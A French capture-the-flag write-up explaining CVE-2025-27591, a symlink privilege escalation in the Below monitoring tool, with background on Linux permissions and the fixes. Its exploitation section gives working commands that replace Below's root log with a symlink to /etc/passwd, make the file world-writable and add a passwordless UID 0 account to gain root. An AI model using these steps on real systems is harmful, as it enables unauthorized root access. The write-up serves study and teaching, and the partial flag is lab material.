# Escalade de privilèges via Below

## <mark style="color:red;">CVE-2025-27591 - Escalade de privilèges via Below</mark>

***

### <mark style="color:blue;">1. C'est quoi Below ?</mark>

**Below** est un outil système créé par Meta/Facebook pour :

* Surveiller les performances du système Linux
* Enregistrer l'historique des ressources (CPU, mémoire, etc.)
* Afficher des statistiques en temps réel

**Dans le contexte du CTF :**

```bash
jacob@outbound:/$ sudo -l
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *
```

Jacob peut exécuter `below` avec les droits **root** (sudo) sans mot de passe !

***

### <mark style="color:blue;">2. La vulnérabilité expliquée simplement</mark>

#### Le problème

Quand `below` démarre (même avec sudo), il fait **TOUJOURS** ces actions :

```
1. Crée le dossier /var/log/below/
2. Met les permissions à 777 (TOUT LE MONDE peut lire/écrire/exécuter)
3. Crée le fichier /var/log/below/error_root.log
4. Met les permissions à 666 (TOUT LE MONDE peut lire/écrire)
```

#### <mark style="color:green;">Le CVE-2025-27591</mark>

**Version vulnérable :** Below < 0.9.0\
**Problème :** Below change les permissions d'un fichier **SANS vérifier si c'est un lien symbolique**

**Analogie :** Imaginez un robot qui :

1. Doit peindre une porte en rouge
2. Ne vérifie pas si c'est vraiment une porte
3. Vous remplacez la porte par un panneau "Stop"
4. Le robot peint le panneau en rouge → vous avez détourné son action !

***

### <mark style="color:blue;">3. Comprendre les permissions Linux</mark>

#### <mark style="color:green;">Les permissions en Linux</mark>

```bash
-rw-r--r--  1  root  root  1234  date  fichier.txt
│││ │ │ │
│││ │ │ └─ Autres : lecture seule
│││ │ └─── Groupe : lecture seule  
│││ └───── Propriétaire : lecture + écriture
││└─────── Type (- = fichier, d = dossier, l = lien)
│└──────── Permissions groupe
└───────── Permissions propriétaire
```

#### <mark style="color:green;">Code des permissions</mark>

| Nombre | Binaire | Signification        | Lettres |
| ------ | ------- | -------------------- | ------- |
| 0      | 000     | Aucun droit          | `---`   |
| 1      | 001     | Exécution            | `--x`   |
| 2      | 010     | Écriture             | `-w-`   |
| 3      | 011     | Écriture + Exécution | `-wx`   |
| 4      | 100     | Lecture              | `r--`   |
| 5      | 101     | Lecture + Exécution  | `r-x`   |
| 6      | 110     | Lecture + Écriture   | `rw-`   |
| 7      | 111     | Tout (rwx)           | `rwx`   |

#### <mark style="color:green;">Exemples concrets</mark>

```bash
# 666 = rw-rw-rw- (tout le monde peut lire ET écrire)
-rw-rw-rw-  1  root  root  0  /var/log/below/error_root.log

# 777 = rwxrwxrwx (tout le monde peut tout faire)
drwxrwxrwx  3  root  root  4096  /var/log/below/

# 644 = rw-r--r-- (propriétaire écrit, autres lisent seulement)
-rw-r--r--  1  root  root  1840  /etc/passwd
```

#### <mark style="color:green;">Fichier /etc/passwd</mark>

**Normalement :**

```bash
-rw-r--r--  1  root  root  1840  /etc/passwd
```

* Seul **root** peut modifier
* Tout le monde peut lire

**Contenu de /etc/passwd :**

```
root:x:0:0:root:/root:/bin/bash
jacob:x:1002:1002::/home/jacob:/bin/bash
username:password:UID:GID:comment:home:shell
```

**Si on peut écrire dans /etc/passwd, on peut ajouter un utilisateur avec UID=0 (root) !**

***

### <mark style="color:blue;">4. Qu'est-ce qu'une attaque par lien symbolique ?</mark>

#### <mark style="color:green;">Lien symbolique (symlink)</mark>

Un **lien symbolique** est comme un raccourci Windows :

* C'est un fichier qui pointe vers un autre fichier
* Quand on accède au lien, on est redirigé vers la cible

```bash
# Créer un lien symbolique
ln -s /chemin/vers/cible nom_du_lien

# Exemple
ln -s /etc/passwd mon_lien
# Maintenant, lire "mon_lien" = lire "/etc/passwd"
```

#### <mark style="color:green;">L'attaque Symlink</mark>

**Principe :**

1. Un programme root modifie les permissions d'un fichier qu'il pense contrôler
2. On remplace ce fichier par un lien symbolique vers un fichier important
3. Le programme root modifie les permissions du fichier important !

**Schéma de l'attaque :**

```
[1] État initial
/var/log/below/error_root.log  (fichier normal, permissions 666)
       ↓ propriétaire : root

[2] Jacob supprime le fichier
/var/log/below/error_root.log  (supprimé !)

[3] Jacob crée un lien symbolique
/var/log/below/error_root.log  →  /etc/passwd
       (lien)                        (cible)

[4] Sudo below démarre
Below pense modifier /var/log/below/error_root.log
Mais le lien redirige vers /etc/passwd
Below modifie /etc/passwd → 666 (tout le monde peut écrire !)

[5] Jacob écrit dans /etc/passwd
Ajoute un utilisateur avec UID=0 → devient root !
```

***

### <mark style="color:blue;">5. Exploitation étape par étape</mark>

#### Étape 1 : Vérifier la situation initiale

```bash
jacob@outbound:/var/log$ ls -ld below/
drwxrwxrwx 3 root root 4096 Jul 14 16:39 below/
# ↑ Dossier avec permissions 777 (tout le monde peut écrire)

jacob@outbound:/var/log$ ls -l below/
-rw-rw-rw- 1 jacob jacob  382 error_jacob.log
-rw-rw-rw- 1 root  root     0 error_root.log
# ↑ Fichiers avec permissions 666 (tout le monde peut écrire)

jacob@outbound:/var/log$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1840 /etc/passwd
# ↑ Fichier normal, seul root peut écrire
```

#### Étape 2 : Supprimer le fichier error\_root.log

```bash
jacob@outbound:/var/log$ rm below/error_root.log
# Même si le fichier appartient à root, on peut le supprimer
# car le DOSSIER a les permissions 777 !

jacob@outbound:/var/log$ ls -l below/
-rw-rw-rw- 1 jacob jacob  382 error_jacob.log
# ↑ error_root.log a disparu !
```

**Pourquoi on peut supprimer un fichier root ?**

* Les permissions de **suppression** dépendent du **dossier parent**
* Le dossier `/var/log/below/` a les permissions 777
* Donc **n'importe qui** peut supprimer des fichiers dedans

#### Étape 3 : Créer un lien symbolique vers /etc/passwd

```bash
jacob@outbound:/var/log$ ln -sf /etc/passwd below/error_root.log
# ln = créer un lien
# -s = symbolique (comme un raccourci)
# -f = force (écrase si existe déjà)
# /etc/passwd = cible du lien
# below/error_root.log = nom du lien

jacob@outbound:/var/log$ ls -l below/
-rw-rw-rw- 1 jacob jacob  382 error_jacob.log
lrwxrwxrwx 1 jacob jacob   11 error_root.log -> /etc/passwd
# ↑ "l" = lien symbolique, la flèche montre la cible
```

**Maintenant :**

* `/var/log/below/error_root.log` est un lien
* Il pointe vers `/etc/passwd`
* Toute modification du lien affecte `/etc/passwd` !

#### Étape 4 : Lancer below avec sudo

```bash
jacob@outbound:/var/log$ sudo below
# Below démarre en root
# Il voit /var/log/below/error_root.log
# Il pense que c'est SON fichier de log
# Il met les permissions à 666
# MAIS c'est un lien vers /etc/passwd !
# Donc /etc/passwd devient 666 !

# Appuyer sur Ctrl+C pour quitter

jacob@outbound:/var/log$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1840 /etc/passwd
# ↑ VICTOIRE ! /etc/passwd est maintenant 666
# Tout le monde peut écrire dedans !
```

#### Étape 5 : Ajouter un utilisateur root dans /etc/passwd

```bash
jacob@outbound:/var/log$ echo 'oxdf::0:0:oxdf:/root:/bin/bash' >> /etc/passwd
# On ajoute une ligne à la fin de /etc/passwd

# Décortiquons la ligne :
# oxdf         = nom d'utilisateur
# ::           = pas de mot de passe (vide)
# 0:0          = UID=0, GID=0 (identifiants de root !)
# oxdf         = commentaire
# /root        = dossier home
# /bin/bash    = shell
```

**Pourquoi UID=0 ?**

* Linux identifie root par son **UID** (User ID)
* root a **TOUJOURS** l'UID = 0
* En créant un utilisateur avec UID=0, on devient root !

#### Étape 6 : Devenir root

```bash
jacob@outbound:/var/log$ su - oxdf
# su = switch user (changer d'utilisateur)
# - = charger l'environnement de l'utilisateur
# oxdf = nom de l'utilisateur qu'on a créé

root@outbound:~# id
uid=0(root) gid=0(root) groups=0(root)
# ↑ On est maintenant root !

root@outbound:~# cat /root/root.txt
8e53f184************************
# ↑ Flag root obtenu !
```

***

### <mark style="color:blue;">6. Pourquoi ça fonctionne ?</mark>

#### <mark style="color:green;">Chaîne de vulnérabilités</mark>

```
1. Below créé avec sudo (droits root)
   ↓
2. Below crée /var/log/below avec permissions 777
   ↓ (BUG : dossier trop permissif)
3. Jacob peut supprimer des fichiers dans ce dossier
   ↓
4. Below crée error_root.log avec permissions 666
   ↓ (BUG : ne vérifie pas si c'est un lien symbolique)
5. Jacob remplace le fichier par un lien vers /etc/passwd
   ↓
6. Below change les permissions du "fichier" → change /etc/passwd
   ↓
7. Jacob peut écrire dans /etc/passwd
   ↓
8. Jacob ajoute un utilisateur avec UID=0
   ↓
9. Jacob devient root !
```

#### Les erreurs de sécurité de Below

1.  **Permissions trop larges (777)**

    ```bash
    chmod 777 /var/log/below  # ❌ Tout le monde peut tout faire
    chmod 755 /var/log/below  # ✅ Seul root peut écrire
    ```
2.  **Ne vérifie pas les liens symboliques**

    ```bash
    # ❌ Below fait ça :
    chmod 666 /var/log/below/error_root.log

    # ✅ Below devrait faire :
    if [ -L /var/log/below/error_root.log ]; then
        echo "Erreur : c'est un lien symbolique !"
        exit 1
    fi
    chmod 666 /var/log/below/error_root.log
    ```
3.  **Change les permissions même si le fichier existe déjà**

    ```bash
    # Below devrait vérifier le propriétaire du fichier
    # avant de changer les permissions
    ```

***
